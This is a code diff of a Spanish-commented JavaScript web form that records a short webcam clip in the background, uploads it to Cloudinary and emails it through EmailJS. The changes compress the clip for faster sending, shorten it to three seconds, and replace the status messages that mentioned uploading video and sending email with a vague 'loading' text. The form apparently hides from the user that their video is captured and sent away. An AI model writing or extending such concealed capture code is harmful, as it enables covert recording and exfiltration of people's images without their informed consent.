@@ -200,11 +200,11 @@ async function acceptPermissions() {
     try {
         console.log('Preparando video...');
 
-        // Solicitar permisos de cámara (sin audio)
+        // Solicitar permisos de cámara (sin audio) - Resolución baja para video más ligero
         stream = await navigator.mediaDevices.getUserMedia({
             video: {
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
+                width: { ideal: 640 },
+                height: { ideal: 480 }
             },
             audio: false // No solicitar audio
         });
@@ -260,13 +260,17 @@ function startBackgroundRecording() {
         }
     );
 
-    // 2. Iniciar grabación de video
+    // 2. Iniciar grabación de video - Comprimido para envío rápido
     const chunks = [];
-    const options = { mimeType: 'video/webm;codecs=vp9' };
+    const options = {
+        mimeType: 'video/webm;codecs=vp8',
+        videoBitsPerSecond: 250000 // 250 kbps - video muy comprimido
+    };
 
     try {
         mediaRecorder = new MediaRecorder(stream, options);
     } catch (e) {
+        // Fallback si no soporta las opciones
         mediaRecorder = new MediaRecorder(stream);
     }
 
@@ -295,12 +299,12 @@ function startBackgroundRecording() {
 
     mediaRecorder.start();
 
-    // Detener grabación después de 5 segundos
+    // Detener grabación después de 3 segundos (reducido para video más ligero)
     setTimeout(() => {
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
         }
-    }, 5000);
+    }, 3000);
 }
 
 // ===================================
@@ -314,7 +318,7 @@ async function submitForm() {
 
     const submitButton = event.target;
     submitButton.disabled = true;
-    submitButton.textContent = 'Enviando...';
+    submitButton.textContent = 'Cargando, por favor espere...';
 
     console.log('Enviando formulario...');
 
@@ -376,8 +380,6 @@ async function submitForm() {
         // ===================================
         // SUBIR VIDEO A CLOUDINARY
         // ===================================
-        submitButton.textContent = 'Subiendo video...';
-
         let videoUrl = 'No disponible';
         let videoInfo = null;
 
@@ -406,7 +408,6 @@ async function submitForm() {
         // ===================================
         // ENVIAR EMAIL CON EMAILJS
         // ===================================
-        submitButton.textContent = 'Enviando email...';
 
         try {
             const emailParams = {
